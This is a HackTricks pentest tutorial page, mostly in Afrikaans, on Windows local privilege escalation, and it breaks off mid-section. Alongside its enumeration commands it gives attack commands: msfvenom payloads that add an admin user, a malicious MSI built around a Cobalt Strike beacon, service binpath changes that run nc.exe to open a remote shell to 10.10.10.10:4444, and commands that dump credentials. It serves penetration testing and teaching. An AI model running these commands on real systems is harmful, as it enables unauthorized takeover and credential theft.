# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Beste hulpmiddel om na Windows local privilege escalation vectors te soek:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Inleidende Windows-teorie

### Access Tokens

**As jy nie weet wat Windows Access Tokens is nie, lees die volgende bladsy voordat jy voortgaan:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Kyk na die volgende bladsy vir meer inligting oor ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**As jy nie weet wat integrity levels in Windows is nie, moet jy die volgende bladsy lees voordat jy voortgaan:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Sekuriteitskontroles

Daar is verskeie dinge in Windows wat jou kan **voorkom om die stelsel te enumerate**, **uitvoerbare lêers te laat loop** of selfs **jou aktiwiteite op te spoor**. Jy moet die volgende **bladsy** **lees** en al hierdie **verdedigings** **meganismes** **enumerate** voordat jy begin met die privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Stelselinfo

### Weergawe-inligting enumeration

Kontroleer of die Windows-weergawe enige bekende kwetsbaarheid het (kontroleer ook watter patches toegepas is).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the **massive attack surface** that a Windows environment presents.

**Op die stelsel**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas het watson ingebed)_

**Lokaal met stelselinligting**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos van exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Omgewing

Is daar enige credential/Juicy-inligting in die env variables gestoor?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geskiedenis
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transkripsielêers

Jy kan leer hoe om dit aan te skakel by [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Besonderhede van PowerShell-pyplyn-uitvoerings word aangeteken, insluitende uitgevoerde opdragte, opdragaanroepe en dele van skripte. Volledige uitvoeringsbesonderhede en uitvoerresultate mag egter nie vasgelê word nie.

Om dit te aktiveer, volg die instruksies in die "Transcript files" afdeling van die dokumentasie, en kies **"Module Logging"** in plaas van **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Om die laaste 15 events van PowersShell logs te sien, kan jy uitvoer:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

'n Volledige rekord van aktiwiteite en die volledige inhoud van die skrip se uitvoering word vasgelê, wat verseker dat elke kodeblok tydens uitvoering gedokumenteer word. Hierdie proses bewaar 'n omvattende ouditspoor van elke aktiwiteit, waardevol vir forensiese ondersoeke en die ontleding van kwaadwillige gedrag. Deur alle aktiwiteit tydens uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Gebeurtenisse van die Script Block-logging kan in die Windows Event Viewer gevind word by die pad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Om die laaste 20 gebeure te sien, kan jy die volgende gebruik:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internetinstellings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Skywe
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Jy kan die stelsel kompromitteer as die opdaterings nie met http**S** versoek word nie, maar met http.

Jy begin deur te kontroleer of die netwerk 'n nie-SSL WSUS-opdatering gebruik deur die volgende in cmd uit te voer:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Of die volgende in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
As jy 'n antwoord ontvang soos een van die volgende:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` of `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gelyk is aan `1`.

Dan is **dit uitbuitbaar.** As die laaste register gelyk is aan `0`, sal die WSUS-invoer geïgnoreer word.

Om hierdie kwesbaarhede te misbruik, kan jy hulpmiddels soos: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gebruik — dit is MiTM-geweaponiseerde uitbuitingskripte om 'fake' updates in nie-SSL WSUS-verkeer in te spuit.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basies is dit die fout wat deur hierdie bug misbruik word:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

Jy kan hierdie kwesbaarheid eksploiteer met die hulpmiddel [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (sodra dit bevry is).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Baie enterprise agents stel 'n localhost IPC-oppervlak en 'n geprivilegieerde opdateringskanaal bloot. As inskrywing gedwing kan word na 'n aanvallerserver en die updater 'n rogue root CA of swak ondertekenaarkontroles vertrou, kan 'n plaaslike gebruiker 'n kwaadwillige MSI lewer wat die SYSTEM-diens installeer. Sien 'n gegeneraliseerde tegniek (gebaseer op die Netskope stAgentSvc-ketting – CVE-2025-0309) hier:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Daar bestaan 'n **local privilege escalation**-kwesbaarheid in Windows **domain**-omgewings onder spesifieke voorwaardes. Hierdie voorwaardes sluit omgewings in waar **LDAP signing nie afgedwing word nie**, gebruikers self-regte het wat hulle toelaat om **Resource-Based Constrained Delegation (RBCD)** te konfigureer, en die vermoë dat gebruikers rekenaars binne die domein kan skep. Dit is belangrik om te noem dat hierdie **vereistes** met **verstekinstellings** vervul word.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**As** hierdie 2 registerinstellings **aangeskakel** is (waarde is **0x1**), kan gebruikers van enige bevoegdheid `*.msi`-lêers **installeer** (uitvoer) as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
As jy 'n meterpreter-sessie het, kan jy hierdie tegniek outomatiseer met die module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Gebruik die `Write-UserAddMSI` command van power-up om binne die huidige gids 'n Windows MSI binary te skep om privilegies te eskaleer. Hierdie skrip skryf 'n vooraf-gekompileerde MSI-installer wat vir 'n gebruiker/groep toevoeging vra (so jy sal GIU access nodig hê):
```
Write-UserAddMSI
```
Voer net die geskepte binêre uit om privileges te eskaleer.

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Maak **Visual Studio** oop, kies **Create a new project** en tik "installer" in die soekboks. Kies die **Setup Wizard** projek en klik **Next**.
- Gee die projek 'n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** vir die ligging, kies **place solution and project in the same directory**, en klik **Create**.
- Hou aan om **Next** te klik totdat jy by stap 3 van 4 uitkom (choose files to include). Klik **Add** en kies die Beacon payload wat jy so pas gegenereer het. Klik dan **Finish**.
- Merk die **AlwaysPrivesc** projek in die **Solution Explorer** en verander in die **Properties** **TargetPlatform** van **x86** na **x64**.
- Daar is ander properties wat jy kan verander, soos die **Author** en **Manufacturer**, wat die geïnstalleerde app meer legitiem kan laat voorkom.
- Regsklik die projek en kies **View > Custom Actions**.
- Regsklik **Install** en kies **Add Custom Action**.
- Dubbelklik op **Application Folder**, kies jou **beacon.exe** lêer en klik **OK**. Dit sal verseker dat die beacon payload uitgevoer word sodra die installer uitgevoer word.
- Onder die **Custom Action Properties**, verander **Run64Bit** na **True**.
- Laastens, **build it**.
- As die waarskuwing `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` verskyn, maak seker jy stel die platform op x64.

### MSI Installation

Om die **installasie** van die kwaadwillige `.msi` lêer in die **agtergrond** uit te voer:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Om hierdie kwesbaarheid te misbruik kan jy gebruik: _exploit/windows/local/always_install_elevated_

## Antivirus en Detektore

### Oudit-instellings

Hierdie instellings bepaal wat **aangeteken** word, dus moet jy daar aandag aan gee
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, dit is interessant om te weet waar die logs naartoe gestuur word
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** is ontwerp vir die **bestuur van lokale Administrator-wagwoorde**, en verseker dat elke wagwoord **unik, ewekansig en gereeld opgedateer** is op rekenaars wat by 'n domein aangesluit is. Hierdie wagwoorde word veilig in Active Directory gestoor en kan slegs deur gebruikers met voldoende permissies via ACLs geraadpleeg word, wat hulle toelaat om plaaslike admin-wagwoorde te sien indien gemagtig.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

As dit aktief is, word **platte-teks wagwoorde in LSASS** (Local Security Authority Subsystem Service) gestoor.\
[**Meer inligting oor WDigest op hierdie bladsy**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Vanaf **Windows 8.1** het Microsoft verbeterde beskerming vir die Local Security Authority (LSA) ingestel om pogings deur onbetroubare prosesse te **blokkeer** om sy geheue te **lees** of kode te injekteer, en sodoende die stelsel verder te beveilig.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** is bekendgestel in **Windows 10**. Dit het ten doel om die credentials wat op 'n toestel gestoor is teen dreigings soos pass-the-hash attacks te beskerm.| [**Meer inligting oor Credential Guard hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Gekasheerde Kredensiale

**Domain credentials** word deur die **Local Security Authority** (LSA) geverifieer en deur bedryfstelselkomponente gebruik. Wanneer 'n gebruiker se aanmelddata deur 'n geregistreerde sekuriteitspakket geverifieer word, word domain credentials vir die gebruiker gewoonlik opgestel.\  
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Gebruikers & Groepe

### Enumereer Gebruikers & Groepe

Jy moet nagaan of enige van die groepe waarvan jy deel is, interessante toegangsregte het
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

As jy **belongs to some privileged group you may be able to escalate privileges**. Leer oor privileged groups en hoe om hulle te misbruik om privileges te escalate hier:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Leer meer** oor wat 'n **token** is op hierdie bladsy: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Kyk na die volgende bladsy om **meer te leer oor interessante tokens** en hoe om hulle te misbruik:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Tuismappe
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Wagwoordbeleid
```bash
net accounts
```
### Kry die inhoud van die knipbord
```bash
powershell -command "Get-Clipboard"
```
## Lopende prosesse

### Lêer- en vouertoestemmings

Eerstens, wanneer jy die prosesse lys, **kontroleer vir wagwoorde binne die command line van die process**.\
Kontroleer of jy **'n lopende binary kan oorskryf**, of jy write permissions op die binary folder het om moontlike [**DLL Hijacking attacks**](dll-hijacking/index.html) uit te buit:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Kontroleer altyd vir moontlike [**electron/cef/chromium debuggers** wat loop, jy kan dit misbruik om bevoegdhede te eskaleer](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kontroleer die regte van die proses-binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kontroleer die toestemmings van die vouers van die proses se binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Jy kan 'n memory dump van 'n lopende proses skep deur **procdump** van sysinternals te gebruik. Dienste soos FTP het dikwels die **credentials in clear text in memory**; probeer om die memory te dump en die credentials uit te lees.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Onveilige GUI-apps

**Toepassings wat as SYSTEM loop, kan 'n gebruiker toelaat om 'n CMD te open, of deur mappes te blaai.**

Example: "Windows Help and Support" (Windows + F1), soek na "command prompt", klik op "Click to open Command Prompt"

## Services

Service Triggers laat Windows 'n service begin wanneer sekere toestande voorkom (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Selfs sonder SERVICE_START-regte kan jy dikwels bevoorregte services begin deur hul triggers af te vuur. Sien enumerasie- en aktiveringstegnieke hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Kry 'n lys van services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissies

Jy kan **sc** gebruik om inligting oor 'n diens te kry
```bash
sc qc <service_name>
```
Dit word aanbeveel om die binary **accesschk** van _Sysinternals_ te hê om die vereiste privilegievlak vir elke diens na te gaan.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Dit word aanbeveel om te kontroleer of "Authenticated Users" enige diens kan wysig:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Aktiveer diens

As jy hierdie fout kry (byvoorbeeld met SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Jy kan dit inskakel met
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Neem in ag dat die diens upnphost afhanklik is van SSDPSRV om te werk (vir XP SP1)**

**Nog 'n ompadoplossing** vir hierdie probleem is om uit te voer:
```
sc.exe config usosvc start= auto
```
### **Wysig diens se binêre pad**

In die scenario waar die "Authenticated users" groep **SERVICE_ALL_ACCESS** op 'n diens het, is dit moontlik om die diens se uitvoerbare binêr te wysig. Om te wysig en **sc** uit te voer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Herbegin diens
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegies kan opgegradeer word deur verskeie toestemmings:

- **SERVICE_CHANGE_CONFIG**: Laat die herkonfigurasie van die service-binaire toe.
- **WRITE_DAC**: Maak toestemmingherkonfigurasie moontlik, wat kan lei tot die vermoë om dienskonfigurasies te verander.
- **WRITE_OWNER**: Gee toestemming om eienaarskap te verkry en toestemmings te herkonfigureer.
- **GENERIC_WRITE**: Erf die vermoë om dienskonfigurasies te verander.
- **GENERIC_ALL**: Erf ook die vermoë om dienskonfigurasies te verander.

Vir die opsporing en uitbuiting van hierdie kwesbaarheid kan die _exploit/windows/local/service_permissions_ gebruik word.

### Swak toestemmings van diens-binaries

**Kyk of jy die binêre wat deur 'n diens uitgevoer word, kan wysig** of as jy **skryfregte op die gids** het waar die binêre geleë is ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Jy kan elke binêre wat deur 'n diens uitgevoer word kry met **wmic** (nie in system32 nie) en jou toestemmings nagaan met **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Jy kan ook **sc** en **icacls** gebruik:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Diensregister wysig toestemmings

Jy moet nagaan of jy enige diensregister kan wysig.\
Jy kan jou **regte** oor 'n **diensregister** **nagaan** deur:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Daar moet gekontroleer word of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** die `FullControl`-toestemmings besit. As dit die geval is, kan die binary wat deur die diens uitgevoer word, verander word.

Om die Path van die uitgevoerde binary te verander:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services-register AppendData/AddSubdirectory toestemmings

As jy hierdie toestemming oor 'n register het, beteken dit dat **jy subregisters van hierdie register kan skep**. In die geval van Windows services is dit **genoeg om arbitrêre kode uit te voer:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Ongekwoteerde Service-paaie

As die pad na 'n uitvoerbare lêer nie tussen aanhalingstekens staan nie, sal Windows probeer om elke gedeelte vóór 'n spasie uit te voer.

Byvoorbeeld, vir die pad _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om die volgende uit te voer:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lys alle ongeciteerde dienspaaie, uitgesonderd dié wat aan ingeboude Windows-dienste behoort:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Jy kan detect and exploit** hierdie kwesbaarheid met metasploit: `exploit/windows/local/trusted\_service\_path` Jy kan handmatig 'n service binary met metasploit skep:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Herstelaksies

Windows laat gebruikers toe om aksies te spesifiseer wat geneem moet word indien 'n diens faal. Hierdie funksie kan gekonfigureer word om na 'n binary te wys. As hierdie binary vervangbaar is, kan privilege escalation moontlik wees. Meer besonderhede is te vinde in die [amptelike dokumentasie](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Toepassings

### Geïnstalleerde toepassings

Kontroleer **toestemmings van die binaries** (dalk kan jy een oorskryf en escalate privileges) en van die **vouers** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Skryfregte

Kyk of jy 'n konfigurasielêer kan wysig om 'n spesiale lêer te lees, of of jy 'n binêre lêer kan wysig wat deur 'n Administrator-rekening uitgevoer gaan word (schedtasks).

Een manier om swak vouer-/lêertoestemmings in die stelsel te vind, is om die volgende te doen:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Voer by opstart uit

**Kyk of jy 'n registry-waarde of binary kan oorskryf wat deur 'n ander gebruiker uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te leer oor interessante **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Bestuurders

Soek moontlike **derdepartye vreemde/kwetsbare** bestuurders
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
As 'n driver 'n arbitrary kernel read/write primitive blootstel (common in poorly designed IOCTL handlers), kan jy eskaleer deur 'n SYSTEM token direk uit kernel memory te steel. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Misbruik van ontbrekende FILE_DEVICE_SECURE_OPEN op device objects (LPE + EDR kill)

Sommige signed third‑party drivers skep hul device object met 'n sterk SDDL via IoCreateDeviceSecure maar vergeet om FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics te stel. Zonder hierdie vlag word die secure DACL nie afgedwing wanneer die device deur 'n pad met 'n ekstra komponent geopen word nie, wat enige unprivileged user toelaat om 'n handle te verkry deur 'n namespace path soos:

- \\ .\\DeviceName\\anything
